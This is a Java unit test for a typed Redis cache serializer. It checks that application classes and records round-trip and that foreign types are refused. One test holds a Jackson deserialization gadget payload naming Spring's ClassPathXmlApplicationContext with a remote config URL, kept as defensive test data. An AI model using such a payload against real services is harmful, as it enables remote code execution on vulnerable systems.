package com.educonnect.common.web.cache;

import org.junit.jupiter.api.Test;
import org.springframework.data.redis.serializer.GenericJacksonJsonRedisSerializer;
import org.springframework.data.redis.serializer.SerializationException;

import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class CacheValueSerializersTest {

    private final GenericJacksonJsonRedisSerializer serializer = CacheValueSerializers.typed();

    @Test
    void applicationTypesComeBackAsTheirOwnClassesIncludingNestedOnes() {
        CachedItem item = new CachedItem();
        item.setId(UUID.randomUUID());
        item.setDueDate(LocalDateTime.of(2026, 10, 1, 18, 0));
        CachedDetail detail = new CachedDetail();
        detail.setScore(90);
        item.setDetail(detail);
        List<CachedItem> items = new ArrayList<>(List.of(item));

        Object restored = serializer.deserialize(serializer.serialize(items));

        assertThat(restored).isInstanceOf(List.class);
        CachedItem restoredItem = (CachedItem) ((List<?>) restored).get(0);
        assertThat(restoredItem.getId()).isEqualTo(item.getId());
        assertThat(restoredItem.getDueDate()).isEqualTo(item.getDueDate());
        assertThat(restoredItem.getDetail().getScore()).isEqualTo(90);
    }

    @Test
    void recordsKeepTheirType() {
        List<CachedRecord> records = new ArrayList<>(List.of(new CachedRecord("Kulüp", 3)));

        Object restored = serializer.deserialize(serializer.serialize(records));

        assertThat(((List<?>) restored).get(0)).isEqualTo(new CachedRecord("Kulüp", 3));
    }

    @Test
    void foreignTypesAreRejected() {
        byte[] payload = ("[\"java.util.ArrayList\",[{\"@class\":\"org.springframework.context.support.ClassPathXmlApplicationContext\","
                + "\"configLocation\":\"http://example.invalid/x.xml\"}]]").getBytes(StandardCharsets.UTF_8);

        assertThatThrownBy(() -> serializer.deserialize(payload))
                .isInstanceOf(SerializationException.class)
                .hasMessageContaining("ClassPathXmlApplicationContext");
    }

    public record CachedRecord(String name, int count) {
    }

    public static class CachedItem {
        private UUID id;
        private LocalDateTime dueDate;
        private CachedDetail detail;

        public UUID getId() {
            return id;
        }

        public void setId(UUID id) {
            this.id = id;
        }

        public LocalDateTime getDueDate() {
            return dueDate;
        }

        public void setDueDate(LocalDateTime dueDate) {
            this.dueDate = dueDate;
        }

        public CachedDetail getDetail() {
            return detail;
        }

        public void setDetail(CachedDetail detail) {
            this.detail = detail;
        }
    }

    public static class CachedDetail {
        private int score;

        public int getScore() {
            return score;
        }

        public void setScore(int score) {
            this.score = score;
        }
    }
}
